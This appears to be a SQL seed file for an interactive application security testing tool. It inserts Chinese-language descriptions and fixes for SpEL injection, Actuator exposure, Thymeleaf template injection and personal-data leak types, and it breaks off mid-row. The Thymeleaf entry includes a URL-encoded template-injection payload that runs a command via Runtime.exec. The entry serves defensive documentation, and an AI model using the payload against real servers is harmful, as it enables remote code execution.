INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (49, 1, 'SPEL表达式注入', 1, 'enable', 1764061220, 'SPEL表达式注入', 'Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。\n', '1、使用SimpleEvaluationContext\n\n官方文档：[https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html](https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html)\n\n```java\nExpressionParser parser = new SpelExpressionParser();  \nUsers users = new Users();  \nEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(users).build();  \nExpression expression = parser.parseExpression(exporession);  \nSystem.out.println(expression.getValue(context));\n```', NULL, NULL, 'Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。\n', NULL, '1、使用SimpleEvaluationContext\n\n官方文档：[https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html](https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html)\n\n```java\nExpressionParser parser = new SpelExpressionParser();  \nUsers users = new Users();  \nEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(users).build();  \nExpression expression = parser.parseExpression(exporession);  \nSystem.out.println(expression.getValue(context));\n```', NULL, 'SPEL表达式注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (50, 1, 'Spring Boot Actuator 未授权', 1, 'enable', 1764061220, 'Spring Boot Actuator 未授权', 'Spring Boot Actuator 未授权访问是一种潜在的安全风险，容易导致应用的敏感信息暴露或被恶意攻击。通过配置适当的身份验证、授权、限制访问范围和暴露的端点，可以有效地防止这些安全问题。', '1. 设置身份验证和授权\n2. 限制暴露的端点', NULL, NULL, 'Spring Boot Actuator 未授权访问是一种潜在的安全风险，容易导致应用的敏感信息暴露或被恶意攻击。通过配置适当的身份验证、授权、限制访问范围和暴露的端点，可以有效地防止这些安全问题。', NULL, '1. 设置身份验证和授权\n2. 限制暴露的端点', NULL, 'Spring Boot Actuator 未授权', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (51, 1, 'Thymeleaf模版注入', 1, 'enable', 1764061220, 'Thymeleaf模版注入', 'Thymeleaf 是与 java 配合使用的一款服务端模板引擎，也是 spring 官方支持的一款服务端模板引擎。他支持 HTML 原型，在 HTML 标签中增加额外的属性来达到模板 + 数据的展示方式。默认前缀：/templates/ ，默认后缀：.html \n- Thymeleaf使用html通过一些特定标签语法代表其含义，但并未破坏html结构，即使无网络、不通过后端渲染也能在浏览器成功打开，大大方便界面的测试和修改。\n- Thymeleaf提供标准和Spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、改JSTL、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。\n- Springboot官方大力推荐和支持，Springboot官方做了很多默认配置，开发者只需编写对应html即可，大大减轻了上手难度和配置复杂度。\n\nThymeleaf支持表达式语法，如果模版参数外部路由传入，用户可控，可能会导致恶意攻击者获取服务器系统权限等。\nThymeleaf 提供了 [预处理](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#preprocessing) 表达式的功能，预处理表达式与普通表达式完全一样，但由双下划线符号包围，如`__${expression}__` ，被预处理的表达式将会被提前执行，并且可以返回当作外层包裹的后续表达式的一部分，例如：`#{selection.__${sel.code}__}`，Thymeleaf 首先进行预处理`${sel.code}`。然后，它使用结果（在本例中为存储值 _ALL_ ）作为稍后计算的实数表达式 ( `#{selection.ALL}`) 的一部分。\nPayload如下\n通过${}::.x构造表达式会由Thymeleaf去执行\n```java\n__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x\n```\n', '#### 2.1.1、Thymeleaf配置\n\n```Plain\nspring.thymeleaf.mode=STRICT_HTML5\n```\n\n将 `spring.thymeleaf.mode` 设置为 `STRICT_HTML5` 时，会影响Thymeleaf模板引擎的行为，在处理HTML模板时更加安全和严格。目的是防止模板注入攻击和确保生成的HTML符合HTML5规范。\n\n使用该配置后，攻击者提交漏洞利用payload，Thymeleaf并不会触发表达式的执行，则会提示以下信息。\n\n```Plain\nView name contains an expression and so does either the URL path or one of the request parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.\n```\n\n**其他配置**\n\n1、spring.thymeleaf.check-template-location\n\n启用或禁用模板位置的检查，默认值为true。开启后，Thymeleaf将仅允许访问特定目录下的模板文件，以防止攻击者访问不应被公开访问的模板文件。\n\n```Plain\nspring.thymeleaf.check-template-location=true\n```\n\n2、spring.thymeleaf.allow-request-override 和 spring.thymeleaf.allow-session-override\n\n控制是否允许请求和会话属性的覆盖，默认为false。开启这些选项可能会导致不安全的操作，因此建议将其保持为false。\n\n```Plain\nspring.thymeleaf.allow-request-override=false\nspring.thymeleaf.allow-session-override=false\n```\n\n3、spring.thymeleaf.prefix 和 spring.thymeleaf.suffix\n\n```Plain\nspring.thymeleaf.prefix=classpath:/templates/ \nspring.thymeleaf.suffix=.html\n```\n\n用于定义模板文件的前缀和后缀，默认情况下，Thymeleaf会在`/src/main/resources/templates/`目录下查找模板文件。可以根据需要自定义这些位置，但要确保只有受信任的目录可用于模板文件。\n\n4、spring.thymeleaf.cache\n\n用于控制模板缓存，默认为true。在生产环境中，建议将其保持为true以提高性能。但在开发环境中，可以将其设置为false，以便在修改模板后立即看到更改。\n\n```Plain\nspring.thymeleaf.cache=true\n```\n\n#### 2.1.2、白名单过滤\n\n根据业务需求进行修复，如漏洞位置出现在切换网页语言时导致的模版注入，如传参: /?lang=en，此时可根据已有的语言模版进行白名单匹配，只允许传入en，zh-cn等字段来防止该问题。\n\n#### 2.1.3、设置@ResponseBody注解\n\n如果设置`ResponseBody`，则不再调用模板解析\n\n```Plain\n@GetMapping(\"/safe/fragment\")  \n@ResponseBody  \npublic String safeFragment(@RequestParam String section) {  \n    return \"welcome :: \" + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name  \n}\n```\n\n#### 2.1.4、设置redirect重定向\n\n```Plain\n@GetMapping(\"/safe/redirect\")  \npublic String redirect(@RequestParam String url) {  \n    return \"redirect:\" + url; //FP as redirects are not resolved as expressions  \n}\n```\n\n根据spring boot定义，如果名称以`redirect:`开头，则不再调用`ThymeleafView`解析，调用`RedirectView`去解析`controller`的返回值\n\n#### 2.1.5、使用HttpServletResponse\n\n```Plain\n@GetMapping(\"/safe/doc/{document}\")\npublic void getDocument(@PathVariable String document, HttpServletResponse response) {\n    log.info(\"Retrieving \" + document); //FP\n}\n```\n\n由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析\n\n#### 2.1.6、漏洞参考Demo\n\n1、https://github.com/veracode-research/spring-view-manipulation/\n\n\n', NULL, NULL, 'Thymeleaf 是与 java 配合使用的一款服务端模板引擎，也是 spring 官方支持的一款服务端模板引擎。他支持 HTML 原型，在 HTML 标签中增加额外的属性来达到模板 + 数据的展示方式。默认前缀：/templates/ ，默认后缀：.html \n- Thymeleaf使用html通过一些特定标签语法代表其含义，但并未破坏html结构，即使无网络、不通过后端渲染也能在浏览器成功打开，大大方便界面的测试和修改。\n- Thymeleaf提供标准和Spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、改JSTL、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。\n- Springboot官方大力推荐和支持，Springboot官方做了很多默认配置，开发者只需编写对应html即可，大大减轻了上手难度和配置复杂度。\n\nThymeleaf支持表达式语法，如果模版参数外部路由传入，用户可控，可能会导致恶意攻击者获取服务器系统权限等。\nThymeleaf 提供了 [预处理](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#preprocessing) 表达式的功能，预处理表达式与普通表达式完全一样，但由双下划线符号包围，如`__${expression}__` ，被预处理的表达式将会被提前执行，并且可以返回当作外层包裹的后续表达式的一部分，例如：`#{selection.__${sel.code}__}`，Thymeleaf 首先进行预处理`${sel.code}`。然后，它使用结果（在本例中为存储值 _ALL_ ）作为稍后计算的实数表达式 ( `#{selection.ALL}`) 的一部分。\nPayload如下\n通过${}::.x构造表达式会由Thymeleaf去执行\n```java\n__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x\n```\n', NULL, '#### 2.1.1、Thymeleaf配置\n\n```Plain\nspring.thymeleaf.mode=STRICT_HTML5\n```\n\n将 `spring.thymeleaf.mode` 设置为 `STRICT_HTML5` 时，会影响Thymeleaf模板引擎的行为，在处理HTML模板时更加安全和严格。目的是防止模板注入攻击和确保生成的HTML符合HTML5规范。\n\n使用该配置后，攻击者提交漏洞利用payload，Thymeleaf并不会触发表达式的执行，则会提示以下信息。\n\n```Plain\nView name contains an expression and so does either the URL path or one of the request parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.\n```\n\n**其他配置**\n\n1、spring.thymeleaf.check-template-location\n\n启用或禁用模板位置的检查，默认值为true。开启后，Thymeleaf将仅允许访问特定目录下的模板文件，以防止攻击者访问不应被公开访问的模板文件。\n\n```Plain\nspring.thymeleaf.check-template-location=true\n```\n\n2、spring.thymeleaf.allow-request-override 和 spring.thymeleaf.allow-session-override\n\n控制是否允许请求和会话属性的覆盖，默认为false。开启这些选项可能会导致不安全的操作，因此建议将其保持为false。\n\n```Plain\nspring.thymeleaf.allow-request-override=false\nspring.thymeleaf.allow-session-override=false\n```\n\n3、spring.thymeleaf.prefix 和 spring.thymeleaf.suffix\n\n```Plain\nspring.thymeleaf.prefix=classpath:/templates/ \nspring.thymeleaf.suffix=.html\n```\n\n用于定义模板文件的前缀和后缀，默认情况下，Thymeleaf会在`/src/main/resources/templates/`目录下查找模板文件。可以根据需要自定义这些位置，但要确保只有受信任的目录可用于模板文件。\n\n4、spring.thymeleaf.cache\n\n用于控制模板缓存，默认为true。在生产环境中，建议将其保持为true以提高性能。但在开发环境中，可以将其设置为false，以便在修改模板后立即看到更改。\n\n```Plain\nspring.thymeleaf.cache=true\n```\n\n#### 2.1.2、白名单过滤\n\n根据业务需求进行修复，如漏洞位置出现在切换网页语言时导致的模版注入，如传参: /?lang=en，此时可根据已有的语言模版进行白名单匹配，只允许传入en，zh-cn等字段来防止该问题。\n\n#### 2.1.3、设置@ResponseBody注解\n\n如果设置`ResponseBody`，则不再调用模板解析\n\n```Plain\n@GetMapping(\"/safe/fragment\")  \n@ResponseBody  \npublic String safeFragment(@RequestParam String section) {  \n    return \"welcome :: \" + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name  \n}\n```\n\n#### 2.1.4、设置redirect重定向\n\n```Plain\n@GetMapping(\"/safe/redirect\")  \npublic String redirect(@RequestParam String url) {  \n    return \"redirect:\" + url; //FP as redirects are not resolved as expressions  \n}\n```\n\n根据spring boot定义，如果名称以`redirect:`开头，则不再调用`ThymeleafView`解析，调用`RedirectView`去解析`controller`的返回值\n\n#### 2.1.5、使用HttpServletResponse\n\n```Plain\n@GetMapping(\"/safe/doc/{document}\")\npublic void getDocument(@PathVariable String document, HttpServletResponse response) {\n    log.info(\"Retrieving \" + document); //FP\n}\n```\n\n由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析\n\n#### 2.1.6、漏洞参考Demo\n\n1、https://github.com/veracode-research/spring-view-manipulation/\n\n\n', NULL, 'Thymeleaf模版注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (52, 1, 'VISA卡泄露', 1, 'enable', 1764061220, 'VISA卡泄露', 'Visa卡信息泄露是指个人或组织的Visa信用卡或借记卡号码以及相关敏感支付信息在未经授权的情况下被公开或泄露给第三方，从而导致个人金融隐私受到威胁的一种严重漏洞。\n一旦Visa卡信息被泄露，攻击者可能会利用这些信息进行各种恶意活动，包括非法购物、金融诈骗、身份盗窃以及非法转账。例如，攻击者可以使用被泄露的卡号进行在线购物或实际购买商品和服务，从而导致卡主账户资金被盗或者欠款增加。此外，Visa卡信息的泄露还可能导致信用评分下降，对卡主的信用记录产生负面影响。\n为了保护Visa卡信息的安全，卡主应当采取一系列预防措施，包括定期检查账单，设置强密码和PIN码，不随意分享卡号等敏感信息，以及在使用卡时保持警惕。同时，金融机构和支付服务提供商也应加强安全措施，监测不正常的交易活动，以及提供卡主保护其账户免受不当使用的手段。\n对于Visa卡信息的不当泄露，相关法律法规应该加以约束和惩罚，以维护金融隐私和金融系统的安全性。这样可以帮助减少Visa卡信息泄露对个人和社会的潜在风险。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, 'Visa卡信息泄露是指个人或组织的Visa信用卡或借记卡号码以及相关敏感支付信息在未经授权的情况下被公开或泄露给第三方，从而导致个人金融隐私受到威胁的一种严重漏洞。\n一旦Visa卡信息被泄露，攻击者可能会利用这些信息进行各种恶意活动，包括非法购物、金融诈骗、身份盗窃以及非法转账。例如，攻击者可以使用被泄露的卡号进行在线购物或实际购买商品和服务，从而导致卡主账户资金被盗或者欠款增加。此外，Visa卡信息的泄露还可能导致信用评分下降，对卡主的信用记录产生负面影响。\n为了保护Visa卡信息的安全，卡主应当采取一系列预防措施，包括定期检查账单，设置强密码和PIN码，不随意分享卡号等敏感信息，以及在使用卡时保持警惕。同时，金融机构和支付服务提供商也应加强安全措施，监测不正常的交易活动，以及提供卡主保护其账户免受不当使用的手段。\n对于Visa卡信息的不当泄露，相关法律法规应该加以约束和惩罚，以维护金融隐私和金融系统的安全性。这样可以帮助减少Visa卡信息泄露对个人和社会的潜在风险。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, 'VISA卡泄露', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (53, 1, '手机号泄露', 1, 'enable', 1764061220, '手机号泄露', '手机号码泄露是指个人或组织的手机号码在未经授权的情况下被公开或泄露给第三方，从而导致个人隐私暴露的一种漏洞。 一旦手机号码被泄露，攻击者可能会利用它们进行欺诈、骚扰、诈骗、身份盗窃等行为。例如，攻击者可能会通过发送恶意短信、电话或电子邮件，诱骗用户提供敏感信息，或者利用手机号码进行钓鱼攻击。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, '手机号码泄露是指个人或组织的手机号码在未经授权的情况下被公开或泄露给第三方，从而导致个人隐私暴露的一种漏洞。 一旦手机号码被泄露，攻击者可能会利用它们进行欺诈、骚扰、诈骗、身份盗窃等行为。例如，攻击者可能会通过发送恶意短信、电话或电子邮件，诱骗用户提供敏感信息，或者利用手机号码进行钓鱼攻击。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, '手机号泄露', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (54, 1, '护照泄露', 1, 'enable', 1764061220, '护照泄露', '护照信息泄露是指个人的护照号码、姓名、出生日期等敏感身份信息在未经授权的情况下被泄露，可能导致身份盗窃、非法入境、金融欺诈等严重风险。这种泄露可能对受害者的金融和法律安全造成严重威胁。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, '护照信息泄露是指个人的护照号码、姓名、出生日期等敏感身份信息在未经授权的情况下被泄露，可能导致身份盗窃、非法入境、金融欺诈等严重风险。这种泄露可能对受害者的金融和法律安全造成严重威胁。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, '护照泄露', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (55, 1, '测试漏洞数据上报正常', 5, 'disable', 1764061220, '测试漏洞数据上报正常', ' ', ' ', NULL, NULL, ' ', NULL, ' ', NULL, '测试漏洞数据上报正常', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (56, 1, '用户地址泄露', 1, 'enable', 1764061220, '用户地址泄露', '家庭地址信息泄露是指个人或家庭的住址在未经授权的情况下被公开或泄露给第三方，可能导致住户的隐私受到侵犯和安全风险。这种泄露可能被不法分子或恶意个体滥用，用于实施入室盗窃、骚扰、网络欺诈或其他不当行为，对住户的安全和隐私构成潜在威胁。因此，保护家庭地址的隐私至关重要，以确保家庭成员的安全和安宁。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, '家庭地址信息泄露是指个人或家庭的住址在未经授权的情况下被公开或泄露给第三方，可能导致住户的隐私受到侵犯和安全风险。这种泄露可能被不法分子或恶意个体滥用，用于实施入室盗窃、骚扰、网络欺诈或其他不当行为，对住户的安全和隐私构成潜在威胁。因此，保护家庭地址的隐私至关重要，以确保家庭成员的安全和安宁。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, '用户地址泄露', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (57, 1, '经纬度信息泄露', 5, 'enable', 1764061220, '经纬度信息泄露', '经纬度信息泄露是指个人或地点的精确地理位置坐标在未经授权的情况下被公开或泄露给第三方，可能导致隐私暴露、个人安全受威胁。这种泄露可能被滥用来跟踪个人的行动、暴露住所或工作地点等敏感信息，对个人安全和隐私构成潜在风险。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, '经纬度信息泄露是指个人或地点的精确地理位置坐标在未经授权的情况下被公开或泄露给第三方，可能导致隐私暴露、个人安全受威胁。这种泄露可能被滥用来跟踪个人的行动、暴露住所或工作地点等敏感信息，对个人安全和隐私构成潜在风险。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, '经纬度信息泄露', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (58, 1, '结婚证泄露', 2, 'enable', 1764061220, '结婚证泄露', '结婚证信息泄露是指结婚证上包含的敏感个人信息在未经授权的情况下被公开或泄露给第三方，从而可能导致隐私侵犯，身份盗窃，社交工程攻击等，因此，结婚证信息的泄露可能对个人的隐私、金融安全和婚姻关系构成严重威胁，需要采取严格的安全措施来防止泄露和滥用。同时，法律和法规也应当制定以保护个人的结婚证信息免受不当访问和滥用。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, '结婚证信息泄露是指结婚证上包含的敏感个人信息在未经授权的情况下被公开或泄露给第三方，从而可能导致隐私侵犯，身份盗窃，社交工程攻击等，因此，结婚证信息的泄露可能对个人的隐私、金融安全和婚姻关系构成严重威胁，需要采取严格的安全措施来防止泄露和滥用。同时，法律和法规也应当制定以保护个人的结婚证信息免受不当访问和滥用。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, '结婚证泄露', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (59, 1, '身份证泄露', 1, 'enable', 1764061220, '身份证泄露', '身份证信息泄露是指个人或组织的身份证号码及相关敏感个人信息在未经授权的情况下被公开或泄露给第三方，从而导致个人隐私暴露的一种严重漏洞。\n一旦身份证信息被泄露，攻击者可能会滥用这些信息进行各种恶意活动，包括身份盗窃、欺诈、虚假身份制作等。例如，攻击者可以使用被泄露的身份证信息来冒充受害者，进行金融诈骗或非法访问受害者的个人账户。此外，这些信息还可以被用于非法购买商品或服务，从而给受害者带来财务损失和法律问题。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, '身份证信息泄露是指个人或组织的身份证号码及相关敏感个人信息在未经授权的情况下被公开或泄露给第三方，从而导致个人隐私暴露的一种严重漏洞。\n一旦身份证信息被泄露，攻击者可能会滥用这些信息进行各种恶意活动，包括身份盗窃、欺诈、虚假身份制作等。例如，攻击者可以使用被泄露的身份证信息来冒充受害者，进行金融诈骗或非法访问受害者的个人账户。此外，这些信息还可以被用于非法购买商品或服务，从而给受害者带来财务损失和法律问题。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, '身份证泄露', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (60, 1, '车牌号泄露', 5, 'enable', 1764061220, '车牌号泄露', '车牌号泄露是指个人或车辆所有者的车牌号码在未经授权的情况下被公开或泄露给第三方，可能导致个人隐私暴露、车辆被盗用或滥用等风险。这种泄露可能被用于追踪个人的行动、实施犯罪活动或者其他不当用途。因此，保护车牌号的隐私对于车主的安全和隐私至关重要。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, '车牌号泄露是指个人或车辆所有者的车牌号码在未经授权的情况下被公开或泄露给第三方，可能导致个人隐私暴露、车辆被盗用或滥用等风险。这种泄露可能被用于追踪个人的行动、实施犯罪活动或者其他不当用途。因此，保护车牌号的隐私对于车主的安全和隐私至关重要。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 